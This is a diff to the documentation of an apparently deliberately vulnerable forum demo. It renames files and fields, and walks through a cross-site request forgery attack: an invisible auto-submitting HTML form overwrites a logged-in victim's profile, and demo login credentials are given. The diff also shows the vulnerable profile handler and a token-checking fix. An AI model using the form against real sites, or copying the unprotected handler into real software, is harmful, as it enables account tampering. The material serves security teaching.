@@ -12,7 +12,7 @@
 1. Purpose: Implements the initial version of the forum where state changing operations rely solely on ambient session cookies without anti CSRF tokens or SameSite restrictions.
 2. Backend (`server/`): Contains Express routes where POST and PUT handlers execute state changes without cryptographic token validation or origin checks.
 3. Frontend (`client/`): Contains the React user interface for discussions, comments, member profiles, and live chat.
-4. Attacker Exploit: Includes `public/attacker_csrf_exploit.html` demonstrating cross origin hidden form auto submission against the live forum.
+4. Attacker Exploit: Includes `public/attackerCsrfExploit.html` demonstrating cross origin hidden form auto submission against the live forum.
 5. Storage: Embedded SQLite database `forum.db` storing discussion posts, comments, live chat messages, and user biographies.
 6. Documentation: Contains `ReadMe.md` and `Vulnerable.md`.
 
@@ -37,11 +37,12 @@ const handleProfileUpdate = (req, res) => {
   if (!req.user) {
     return res.status(401).json({ error: 'Authentication required.' });
   }
-  const { full_name, bio } = req.body;
+  const fullName = req.body.fullName || req.body.full_name || req.user.full_name;
+  const bio = req.body.bio !== undefined ? req.body.bio : req.user.bio;
   const db = getDB();
   db.prepare('UPDATE users SET full_name = ?, bio = ? WHERE id = ?').run(
-    full_name || req.user.full_name,
-    bio !== undefined ? bio : req.user.bio,
+    fullName,
+    bio,
     req.user.id
   );
   return res.json({ message: 'Profile updated successfully' });
@@ -61,10 +62,10 @@ res.cookie('session_token', token, {
 ### 4.1 Step by Step Attack Walkthrough:
 1. Step 1: The victim logs into the forum platform using credentials for `mridankan` with password `mridankan123`.
 2. Step 2: The browser receives the `session_token` cookie and stores it for `localhost:3000`.
-3. Step 3: The attacker hosts an external webpage `attacker_csrf_exploit.html` containing an invisible HTML form.
+3. Step 3: The attacker hosts an external webpage `attackerCsrfExploit.html` containing an invisible HTML form.
 ```html
 <form id="csrfForm" action="http://localhost:3000/api/auth/profile" method="POST">
-  <input type="hidden" name="full_name" value="Mridankan Mandal (Hijacked via CSRF)" />
+  <input type="hidden" name="fullName" value="Mridankan Mandal (Hijacked via CSRF)" />
   <input type="hidden" name="bio" value="Account profile compromised via Cross Site Request Forgery." />
 </form>
 <script>
@@ -97,7 +98,7 @@ res.cookie('session_token', token, {
 ```javascript
 function verifyCsrf(req, res, next) {
   if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
-  const submittedToken = req.headers['x_csrf_token'] || req.body?.csrf_token;
+  const submittedToken = req.headers['x_csrf_token'] || req.body?.csrfToken || req.body?.csrf_token;
   const expectedToken = req.user?.csrfToken;
   if (!submittedToken || !expectedToken || submittedToken !== expectedToken) {
     return res.status(403).json({
